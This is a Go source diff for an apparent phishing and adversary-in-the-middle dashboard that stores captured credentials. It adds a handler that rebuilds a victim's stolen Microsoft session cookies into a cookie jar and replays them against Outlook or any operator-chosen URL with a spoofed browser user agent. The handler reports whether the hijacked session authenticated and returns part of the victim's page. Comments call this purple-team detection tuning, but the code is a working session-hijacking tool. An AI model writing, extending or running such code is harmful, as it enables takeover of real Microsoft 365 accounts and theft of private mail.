@@ -3,11 +3,15 @@ package handlers
 import (
 	"crypto/tls"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
+	"net/http/cookiejar"
 	"net/mail"
 	"net/smtp"
+	"net/url"
 	"os"
 	"os/exec"
 	"sort"
@@ -764,6 +768,165 @@ func (h *APIHandler) HandleCreateLure(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	writeJSON(w, http.StatusCreated, map[string]any{"phishlet": body.Phishlet, "path": body.Path})
+}
+
+// HandleReplaySession attempts to use the captured cookies of a
+// session against Microsoft's web surface (outlook.office.com by
+// default; portal.office.com on demand) so the operator can confirm
+// the session is hot AND so the target's CSOC observes a known
+// adversary-style sign-in for detection-tuning purposes.
+//
+// This is the purple-team validation step: send authenticated
+// traffic from a known attacker IP using stolen tokens, then walk
+// the defenders through their SIEM to see what fired. The dashboard
+// host's IP is the source; the CSOC should pre-receive a list of
+// allowed test IPs so the alert is unambiguous.
+//
+// Body (optional): {"target":"https://outlook.office.com/"}.
+// Response includes: success bool, final URL, HTTP status,
+// authenticated bool (false if Microsoft bounced us back to the
+// login page), elapsed ms, response-body snippet (4KB max).
+func (h *APIHandler) HandleReplaySession(w http.ResponseWriter, r *http.Request) {
+	sid := mux.Vars(r)["session_id"]
+	if sid == "" {
+		writeError(w, http.StatusBadRequest, "session_id required")
+		return
+	}
+	creds, err := h.DB.GetAllCredentials()
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "db error")
+		return
+	}
+	var match *store.CapturedCredential
+	for i := range creds {
+		if creds[i].SessionID == sid {
+			match = &creds[i]
+			break
+		}
+	}
+	if match == nil {
+		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+	if !match.HasReplayableSessionCookie() {
+		writeError(w, http.StatusBadRequest, "session has no replayable Microsoft auth cookies (status: "+match.Status()+")")
+		return
+	}
+
+	target := "https://outlook.office.com/"
+	if t := r.URL.Query().Get("target"); t != "" {
+		target = t
+	}
+
+	// Build a cookie jar from the captured tokens. The on-disk
+	// schema is map[domain]map[name]{Name,Value,Path,HttpOnly}.
+	type rawCookie struct {
+		Name     string `json:"Name"`
+		Value    string `json:"Value"`
+		Path     string `json:"Path"`
+		HttpOnly bool   `json:"HttpOnly"`
+	}
+	var raw map[string]map[string]rawCookie
+	if err := json.Unmarshal([]byte(match.TokensJSON), &raw); err != nil {
+		writeError(w, http.StatusInternalServerError, "tokens parse failed: "+err.Error())
+		return
+	}
+
+	jar, _ := cookiejar.New(nil)
+	for domain, byName := range raw {
+		// CookieJar.SetCookies wants a canonical URL; strip leading dot.
+		host := strings.TrimPrefix(domain, ".")
+		u, err := url.Parse("https://" + host + "/")
+		if err != nil {
+			continue
+		}
+		var cookies []*http.Cookie
+		for name, c := range byName {
+			cookies = append(cookies, &http.Cookie{
+				Name:     valueOr(c.Name, name),
+				Value:    c.Value,
+				Path:     valueOr(c.Path, "/"),
+				HttpOnly: c.HttpOnly,
+				Secure:   true,
+				Domain:   host,
+			})
+		}
+		jar.SetCookies(u, cookies)
+	}
+
+	// Track redirect chain so the operator can correlate the trace
+	// with what their CSOC sees in proxy / sign-in logs.
+	chain := []string{}
+	client := &http.Client{
+		Jar: jar,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
+		},
+		Timeout: 30 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 12 {
+				return errors.New("too many redirects")
+			}
+			chain = append(chain, req.URL.String())
+			return nil
+		},
+	}
+
+	req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, target, nil)
+	if err != nil {
+		writeError(w, http.StatusBadRequest, "bad target: "+err.Error())
+		return
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+
+	started := time.Now()
+	resp, err := client.Do(req)
+	elapsed := time.Since(started)
+	if err != nil {
+		writeJSON(w, http.StatusOK, map[string]any{
+			"success":        false,
+			"session_id":     sid,
+			"username":       match.Username,
+			"target":         target,
+			"redirect_chain": chain,
+			"error":          err.Error(),
+			"duration_ms":    elapsed.Milliseconds(),
+			"started_at":     started.UTC().Format(time.RFC3339),
+		})
+		return
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+
+	finalURL := resp.Request.URL.String()
+	finalHost := resp.Request.URL.Host
+	// If we ended up at a Microsoft login origin, the cookies didn't
+	// authenticate us; Microsoft is asking us to log in afresh.
+	bouncedToLogin := strings.HasSuffix(finalHost, "login.microsoftonline.com") ||
+		strings.HasSuffix(finalHost, "login.live.com") ||
+		strings.HasSuffix(finalHost, "login.microsoftonline.us") ||
+		strings.HasSuffix(finalHost, "account.microsoft.com") && strings.Contains(finalURL, "login")
+
+	authenticated := !bouncedToLogin && resp.StatusCode < 400
+
+	writeJSON(w, http.StatusOK, map[string]any{
+		"success":        authenticated,
+		"session_id":     sid,
+		"username":       match.Username,
+		"target":         target,
+		"final_url":      finalURL,
+		"final_host":     finalHost,
+		"status_code":    resp.StatusCode,
+		"authenticated":  authenticated,
+		"redirect_chain": chain,
+		"duration_ms":    elapsed.Milliseconds(),
+		"started_at":     started.UTC().Format(time.RFC3339),
+		"source_ip":      "(this dashboard host - share with CSOC for alert correlation)",
+		"body_snippet":   string(body),
+	})
 }
 
 func randString(n int) string {
